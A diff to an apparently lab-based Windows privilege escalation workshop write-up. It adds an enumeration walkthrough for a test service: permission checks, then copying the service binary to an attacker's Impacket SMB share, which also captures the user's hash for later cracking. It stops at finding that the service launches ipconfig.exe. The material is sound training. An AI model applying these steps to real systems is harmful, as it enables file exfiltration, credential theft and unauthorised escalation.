@@ -561,19 +561,19 @@ PS C:\Windows\system32>
 Whenever we encounter non-standard services, we want to audit their security. Privesc scripts are good for that, but we should also do it manually. I like to audit Windows Services using these steps:
 
 1. Service Path
-  a. Is the service path quoted?
-  b. Is the service binary writable with my permissions?
-  c. Is the directory of the service binary writable?
+  * Is the service path quoted?
+  * Is the service binary writable with my permissions?
+  * Is the directory of the service binary writable?
 2. Registry
-  a. Are the registry entries for the service writable?
-  b. Are there keys that the service is referencing that are writable?
-  c. Is the service modifying OTHER registry keys?
+  * Are the registry entries for the service writable?
+  * Are there keys that the service is referencing that are writable?
+  * Is the service modifying OTHER registry keys?
 3. PATH issues
-  a. Are there things in front of %WINDIR% in the PATH?
-  b. Is the first thing in the PATH writable?
+  * Are there things in front of %WINDIR% in the PATH?
+  * Is the first thing in the PATH writable?
 4. Hijacking issues
-  a. Is the service referencing dlls/exes by relative instead of absolute paths?
-  b. Is the service relying on Windows to locate binaries?
+  * Is the service referencing dlls/exes by relative instead of absolute paths?
+  * Is the service relying on Windows to locate binaries?
   
 These are some quick checks we can do to audit services.
 
@@ -688,5 +688,103 @@ LPETestbed
 
 C:\Windows\system32>
 ````
+
+
+Next let's take a look at another non-standard service:
+
+````
+Name             : PathHijackService
+  DisplayName      : PathHijackService
+  Company Name     : 
+  Description      : 
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files\Path Hijack\PathHijackService.exe"
+  IsDotNet         : True
+  ````
+Looking at this service:
+The path is quoted. Let's check our permissions on the folder:
+
+````
+PS C:\Program Files> icacls.exe "Path Hijack"
+Path Hijack NT SERVICE\TrustedInstaller:(I)(F)
+            NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+            NT AUTHORITY\SYSTEM:(I)(F)
+            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+            BUILTIN\Administrators:(I)(F)
+            BUILTIN\Users:(I)(RX)
+            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Program Files> 
+````
+We don't have rights to the folder.
+````
+PS C:\Program Files\Path Hijack> icacls.exe * 
+PathHijackService.exe NT AUTHORITY\SYSTEM:(I)(F)
+                      BUILTIN\Administrators:(I)(F)
+                      BUILTIN\Users:(I)(RX)
+
+PathHijackService.exe.xml NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+
+Successfully processed 2 files; Failed processing 0 files
+PS C:\Program Files\Path Hijack> 
+````
+We don't have rights to the executable or the config file.
+
+````
+PS C:\Program Files\Path Hijack> Get-Acl -Path HKLM:\System\CurrentControlSet\Services\PathHijackService |fl
+
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\PathHijackService
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : BUILTIN\Users Allow  ReadKey
+         BUILTIN\Users Allow  -2147483648
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         CREATOR OWNER Allow  268435456
+Audit  : 
+Sddl   : O:BAG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A
+         ;CIIOID;GA;;;CO)
+````
+We can't modify the registry key.
+
+So now we start looking into other kinds of hijacks.
+
+Let's grab a copy of the executable:
+
+````
+PS C:\Program Files\Path Hijack> Copy-Item "C:\Program Files\Path Hijack\PathHijackService.exe" -Destination "C:\Users\user\Downloads\PathHijackService.exe"
+````
+Now let's transfer it to our attacking platform:
+
+We setup an SMB share:
+
+````
+root@kali:~/Tools/impacket/examples# python smbserver.py Shared /root/LPEWorkshop/
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+
+````
+
+Then we transfer the file over:
+
+````
+Copy-Item "C:\Users\user\Downloads\PathHijackService.exe" -Destination "\\10.22.6.122\Shared\PathHijackService.exe"
+
+````
+Coincidentally we also got the user hash, so we should try to crack that at some point.
+
+Now we can start analyzing the service.
+
+Let's use r2 to look at the service (I won't try to summarize using r2, that's homework for you)
+
+We can eventually find that the service is starting "ipconfig.exe" on a timer.
+
 
 
